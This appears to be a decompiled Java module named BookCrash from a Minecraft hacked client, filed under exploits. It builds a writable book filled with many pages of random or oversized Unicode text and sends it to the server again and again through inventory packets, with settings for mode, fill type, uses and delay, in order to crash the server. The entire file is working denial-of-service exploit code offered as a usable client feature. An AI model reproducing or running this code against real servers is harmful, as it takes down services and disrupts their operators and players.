package me.zeroeightsix.kami.module.modules.exploits;

import me.zeroeightsix.kami.command.Command;
import me.zeroeightsix.kami.module.Module;
import me.zeroeightsix.kami.setting.Setting;
import me.zeroeightsix.kami.setting.Settings;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

@Module.Info(name = "BookCrash", category = Module.Category.EXPLOITS)

public class BookCrash extends Module {
   private int currDelay;
   private Setting mode;
   private Setting fillMode;
   private Setting uses;
   private Setting delay;
   private Setting pagesSettings;
   private Setting autoToggle;

   public BookCrash() {
      this.mode = this.register(Settings.e("Mode", BookCrash.Mode.RAION));
      this.fillMode = this.register(Settings.e("Fill Mode", BookCrash.FillMode.RANDOM));
      this.uses = this.register(Settings.i("Uses", 5));
      this.delay = this.register(Settings.i("Delay", 0));
      this.pagesSettings = this.register(Settings.i("Pages", 50));
      this.autoToggle = this.register(Settings.b("AutoToggle", true));
   }

   public void onUpdate() {
      if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
         Command.sendChatMessage("You're not connected to a server!");
         this.disable();
      }

      this.currDelay = this.currDelay >= (Integer)this.delay.getValue() ? 0 : (Integer)this.delay.getValue() + 1;
      if (this.currDelay <= 0) {
         ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
         NBTTagList list = new NBTTagList();
         NBTTagCompound tag = new NBTTagCompound();
         String author = "Ollie";
         String title = "\n Ollie says hi \n";
         String size = "";
         int pages = Math.min((Integer)this.pagesSettings.getValue(), 100);
         int pageChars = 210;
         IntStream chars;
         if (((BookCrash.FillMode)this.fillMode.getValue()).equals(BookCrash.FillMode.RANDOM)) {
            chars = (new Random()).ints(128, 1112063).map((ix) -> {
               return ix < 55296 ? ix : ix + 2048;
            });
            size = (String)chars.limit((long)(pageChars * pages)).mapToObj((ix) -> {
               return String.valueOf((char)ix);
            }).collect(Collectors.joining());
         } else if (((BookCrash.FillMode)this.fillMode.getValue()).equals(BookCrash.FillMode.FFFF)) {
            size = repeat(pages * pageChars, String.valueOf(1114111));
         } else if (((BookCrash.FillMode)this.fillMode.getValue()).equals(BookCrash.FillMode.ASCII)) {
            chars = (new Random()).ints(32, 126);
            size = (String)chars.limit((long)(pageChars * pages)).mapToObj((ix) -> {
               return String.valueOf((char)ix);
            }).collect(Collectors.joining());
         } else if (((BookCrash.FillMode)this.fillMode.getValue()).equals(BookCrash.FillMode.OLD)) {
            size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
         }

         int i;
         for(i = 0; i < pages; ++i) {
            NBTTagString tString = new NBTTagString(size);
            list.appendTag(tString);
         }

         tag.setString("author", author);
         tag.setString("title", title);
         tag.setTag("pages", list);
         bookObj.setTagInfo("pages", list);
         bookObj.setTagCompound(tag);

         for(i = 0; i < (Integer)this.uses.getValue(); ++i) {
            mc.playerController.connection.sendPacket(new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
            if (this.mode.getValue() == BookCrash.Mode.JESSICA) {
               mc.playerController.connection.sendPacket(new CPacketCreativeInventoryAction(0, bookObj));
            }
         }
      }
   }

   private static String repeat(int count, String with) {
      return (new String(new char[count])).replace("\u0000", with);
   }

   private static enum FillMode {
      ASCII,
      FFFF,
      RANDOM,
      OLD;
   }

   private static enum Mode {
      JESSICA,
      RAION;
   }
}